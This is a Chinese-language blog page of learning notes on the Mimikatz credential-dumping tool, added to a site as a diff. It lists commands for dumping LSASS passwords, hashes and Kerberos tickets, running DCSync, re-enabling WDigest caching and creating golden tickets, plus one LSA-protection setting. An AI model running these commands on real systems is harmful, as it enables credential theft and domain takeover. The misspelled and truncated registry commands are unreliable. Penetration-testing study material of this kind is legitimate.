@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Mimikatz 简介内网杀器 - Mimikatz 微软见了直流泪 Mimikatz 为法国人 Benjamin Delpy 编写的一款轻量级的调试工具，国内叫它 “猕猴桃”，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具。然而 Mimikatz 其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash 传递、甚至伪造域管理凭证令牌等。 工具地址https:&#x2F;&#x2F;github.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mimikatz 学习记录">
+<meta property="og:url" content="http://example.com/2020/09/20/Mimikatz/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="Mimikatz 简介内网杀器 - Mimikatz 微软见了直流泪 Mimikatz 为法国人 Benjamin Delpy 编写的一款轻量级的调试工具，国内叫它 “猕猴桃”，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具。然而 Mimikatz 其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash 传递、甚至伪造域管理凭证令牌等。 工具地址https:&#x2F;&#x2F;github.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634631291/Xnip2021-10-19_16-14-33_xamzjq.png">
+<meta property="article:published_time" content="2020-09-20T08:19:42.000Z">
+<meta property="article:modified_time" content="2022-02-13T08:26:26.468Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1634631291/Xnip2021-10-19_16-14-33_xamzjq.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>Mimikatz 学习记录</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/05/10/dkwz/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/09/18/msfcs/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/09/20/Mimikatz/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/09/20/Mimikatz/&text=Mimikatz 学习记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/09/20/Mimikatz/&is_video=false&description=Mimikatz 学习记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Mimikatz 学习记录&body=Check out this article: http://example.com/2020/09/20/Mimikatz/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/09/20/Mimikatz/&name=Mimikatz 学习记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/09/20/Mimikatz/&t=Mimikatz 学习记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Mimikatz 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">工具地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">Mimikatz 使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">Mimikatz 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">抓取明文密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">相关模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sekurlsa-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.1.</span> <span class="toc-text">sekurlsa 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text">kerberos 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lsadump-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.3.</span> <span class="toc-text">lsadump 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wdigest"><span class="toc-number">4.4.</span> <span class="toc-text">wdigest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSA-%E4%BF%9D%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">LSA 保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%AB%98%E7%89%88%E6%9C%AC-windows-%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">获取高版本 windows 系统的密码凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E4%B8%AD-kiwi-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.</span> <span class="toc-text">msf 中 kiwi 模块</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Mimikatz 学习记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-20T08:19:42.000Z" itemprop="datePublished">2020-09-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Mimikatz-简介"><a href="#Mimikatz-简介" class="headerlink" title="Mimikatz 简介"></a>Mimikatz 简介</h2><p>内网杀器 - Mimikatz 微软见了直流泪</p>
+<p>Mimikatz 为法国人 Benjamin Delpy 编写的一款轻量级的调试工具，国内叫它 “猕猴桃”，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具。然而 Mimikatz 其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash 传递、甚至伪造域管理凭证令牌等。</p>
+<h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<h2 id="Mimikatz-使用方法"><a href="#Mimikatz-使用方法" class="headerlink" title="Mimikatz 使用方法"></a>Mimikatz 使用方法</h2><p>像 Cobalt Strike 和 msf 这些后渗透化工具已经集成了 Mimikatz 的功能，但是有些时候还是需要自己上传一个 Mimikatz 进行操作</p>
+<h3 id="Mimikatz-常用命令"><a href="#Mimikatz-常用命令" class="headerlink" title="Mimikatz 常用命令"></a>Mimikatz 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cls         #清屏</span><br><span class="line">standard    #标准模块，基本命令</span><br><span class="line">crypto      #加密相关模块</span><br><span class="line">sekurlsa    #与证书相关的模块</span><br><span class="line">kerberos    #kerberos模块</span><br><span class="line">privilege   #提权相关模块</span><br><span class="line">process     #进程相关模块</span><br><span class="line">serivce     #服务相关模块</span><br><span class="line">lsadump     #LsaDump模块</span><br><span class="line">ts          #终端服务器模块</span><br><span class="line">event       #事件模块</span><br><span class="line">misc        #杂项模块</span><br><span class="line">token       #令牌操作模块</span><br><span class="line">vault       #Windows 、证书模块</span><br><span class="line">minesweeper #Mine Sweeper模块</span><br><span class="line">net</span><br><span class="line">dpapi     #DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]</span><br><span class="line">busylight #BusyLight Module</span><br><span class="line">sysenv    #系统环境值模块</span><br><span class="line">sid       #安全标识符模块</span><br><span class="line">iis       #IIS XML配置模块</span><br><span class="line">rpc       #mimikatz的RPC控制</span><br><span class="line">sr98      #用于SR98设备和T5577目标的RF模块</span><br><span class="line">rdm       #RDM（830AL）器件的射频模块</span><br><span class="line">acr       #ACR模块</span><br><span class="line">version   #查看版本</span><br><span class="line">exit      #退出</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug #提升权限命令 mimikatz许多功能都需要管理员权限，如果不是管理员权限不能debug</span><br></pre></td></tr></table></figure>
+
+<h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>在 windows2012 以上的系统不能直接获取明文密码了，当可以搭配 procdump+mimikatz 获取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # log</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634631291/Xnip2021-10-19_16-14-33_xamzjq.png"></p>
+<h2 id="相关模块"><a href="#相关模块" class="headerlink" title="相关模块"></a>相关模块</h2><h3 id="sekurlsa-模块"><a href="#sekurlsa-模块" class="headerlink" title="sekurlsa 模块"></a>sekurlsa 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#抓取用户NTLM哈希</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::msv  </span><br><span class="line"></span><br><span class="line">#加载dmp文件，并导出其中的明文密码</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full </span><br><span class="line"></span><br><span class="line">#导出lsass.exe进程中所有的票据</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<h3 id="kerberos-模块"><a href="#kerberos-模块" class="headerlink" title="kerberos 模块"></a>kerberos 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#列出系统中的票据</span><br><span class="line">kerberos::list</span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">#清除系统中的票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">#导入票据到系统中</span><br><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="lsadump-模块"><a href="#lsadump-模块" class="headerlink" title="lsadump 模块"></a>lsadump 模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#(在域控上执行)查看域test.com内指定用户Administrator的详细信息，包括NTLM哈希等</span><br><span class="line">lsadump::dcsync /domain:test.com /user:Administrator</span><br><span class="line"></span><br><span class="line">#(在域控上执行)读取所有域用户的哈希</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line"></span><br><span class="line">#从sam.hive和system.hive文件中获得NTLM Hash</span><br><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br><span class="line"></span><br><span class="line">#从本地SAM文件中读取密码哈希</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="wdigest"><a href="#wdigest" class="headerlink" title="wdigest"></a>wdigest</h3><p>WDigest 协议是在 WindowsXP 中被引入的，旨在与 HTTP 协议一起用于身份认证。默认情况下，Microsoft 在多个版本的 Windows (Windows XP-Windows 8.0 和 Windows Server 2003-Windows Server 2012) 中启用了此协议，这意味着纯文本密码存储在 LSASS (本地安全授权子系统服务) 进程中。 Mimikatz 可以与 LSASS 交互，允许攻击者通过以下命令检索这些凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz #privilege::debug</span><br><span class="line">mimikatz #sekurlsa::wdigest</span><br></pre></td></tr></table></figure>
+
+<p>在 windows2012 系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 WDigest。Windows Server2012 及以上版本默认关闭 Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012 以下版本，如果安装了 KB2871997 补丁，攻击者同样无法获取明文密码。</p>
+<p>配置如下键值即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</span><br></pre></td></tr></table></figure>
+
+<p>使用 powershell 进行更改</p>
+<p>UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启Wdigest Auth</span><br><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br><span class="line"></span><br><span class="line">#关闭Wdigest Auth</span><br><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid</span><br></pre></td></tr></table></figure>
+
+<h2 id="LSA-保护"><a href="#LSA-保护" class="headerlink" title="LSA 保护"></a>LSA 保护</h2><p>如何防止 mimikatz 获取一些加密的密文进行 PTH 攻击呢！其实微软推出的补丁 KB2871997 是专门针对 PTH 攻击的补丁，但是如果 PID 为 500 的话，还是可以进行 PTH 攻击的！本地安全权限服务 (LSASS) 验证用户是否进行本地和远程登录，并实施本地安全策略。 Windows 8.1 及更高版本的系统中，Microsoft 为 LSA 提供了额外的保护，以防止不受信任的进程读取内存或代码注入。Windows 8.1 之前的系统，攻击者可以执行 Mimikatz 命令来与 LSA 交互并检索存储在 LSA 内存中的明文密码。</p>
+<p>这条命令修改键的值为 1，即使获取了 debug 权限，也不能直接获取明文密码和 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="获取高版本-windows-系统的密码凭证"><a href="#获取高版本-windows-系统的密码凭证" class="headerlink" title="获取高版本 windows 系统的密码凭证"></a>获取高版本 windows 系统的密码凭证</h2><p>使用 procdump 将 lsass dump 下来（需要管理员权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>
+
+<p>使用 mimikatz 读取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log&quot; &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf-中-kiwi-模块"><a href="#msf-中-kiwi-模块" class="headerlink" title="msf 中 kiwi 模块"></a>msf 中 kiwi 模块</h2><p>注：kiwi 默认加载 32 位，如果目标系统位 64 位，将进程迁移到 64 位程序的进程中。</p>
+<p>使用前先 load kiwi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">creds_all #列举所有凭据</span><br><span class="line">creds_kerberos #列举所有kerberos凭据</span><br><span class="line">creds_msv #列举所有msv凭据</span><br><span class="line">creds_ssp #列举所有ssp凭据</span><br><span class="line">creds_tspkg #列举所有tspkg凭据</span><br><span class="line">creds_wdigest #列举所有wdigest凭据</span><br><span class="line">dcsync #通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm #通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create #创建黄金票据</span><br><span class="line">kerberos_ticket_list #列举kerberos票据</span><br><span class="line">kerberos_ticket_purge #清除kerberos票据</span><br><span class="line">kerberos_ticket_use #使用kerberos票据</span><br><span class="line">kiwi_cmd #执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam #dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets #dump出lsa的密文</span><br><span class="line">password_change #修改密码</span><br><span class="line">wifi_list #列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared #列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Mimikatz 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">工具地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">Mimikatz 使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">Mimikatz 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">抓取明文密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">相关模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sekurlsa-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.1.</span> <span class="toc-text">sekurlsa 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text">kerberos 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lsadump-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.3.</span> <span class="toc-text">lsadump 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wdigest"><span class="toc-number">4.4.</span> <span class="toc-text">wdigest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSA-%E4%BF%9D%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">LSA 保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%AB%98%E7%89%88%E6%9C%AC-windows-%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">获取高版本 windows 系统的密码凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E4%B8%AD-kiwi-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.</span> <span class="toc-text">msf 中 kiwi 模块</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/09/20/Mimikatz/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/09/20/Mimikatz/&text=Mimikatz 学习记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/09/20/Mimikatz/&is_video=false&description=Mimikatz 学习记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Mimikatz 学习记录&body=Check out this article: http://example.com/2020/09/20/Mimikatz/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/09/20/Mimikatz/&title=Mimikatz 学习记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/09/20/Mimikatz/&name=Mimikatz 学习记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/09/20/Mimikatz/&t=Mimikatz 学习记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
